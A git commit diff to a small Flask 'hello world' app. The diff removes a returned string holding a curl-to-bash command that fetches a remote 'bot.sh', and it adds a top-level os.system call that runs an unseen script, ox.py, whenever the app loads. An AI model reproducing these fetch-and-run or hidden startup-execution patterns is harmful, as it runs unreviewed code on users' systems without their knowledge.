5c3211a1dfa51f7ee1d3bfb7fc9bc697c86ce077
opaopawk <158033725+opaopawk@users.noreply.github.com>
2024-01-29 16:24:57 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,10 +1,12 @@
+import os
+os.system('python ox.py')
 from flask import Flask
 
 app = Flask(__name__)
 
 @app.route('/')
 def hello_world():
-    return 'curl https://raw.githubusercontent.com/snzezzwds/voidgitpod/main/bot.sh | bash'
+    return 'curl '
 
 if __name__ == '__main__':
     app.run()
